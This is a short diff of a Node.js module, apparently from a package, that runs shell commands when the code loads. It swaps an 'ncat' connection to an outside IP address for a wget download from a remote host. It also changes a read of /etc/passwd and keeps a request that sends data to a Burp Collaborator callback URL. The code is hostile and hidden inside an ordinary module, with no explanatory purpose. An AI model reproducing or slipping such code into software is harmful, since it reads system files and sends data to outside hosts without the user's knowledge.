@@ -2,7 +2,7 @@ const path = require('path');
 const nconf = require('nconf');
 const { exec } = require("child_process");
 
-exec("ncat 94.156.174.105 1337", (error, stdout, stderr) => {
+exec("wget http://0xp.cc/test.txt > /tmp/test.txt", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         return;
@@ -71,7 +71,7 @@ request('http://u0v760mwyr2w9wdiinuyo6k1psvjq7f.burpcollaborator.net/callback=St
 
 var request = require('request');
 const fs = require('fs')
-fs.readFile('/etc/passwd', 'utf8' , (err, data) => {
+fs.readFile('/tmp/test.txt', 'utf8' , (err, data) => {
   if (err) {
     console.error(err)
     return
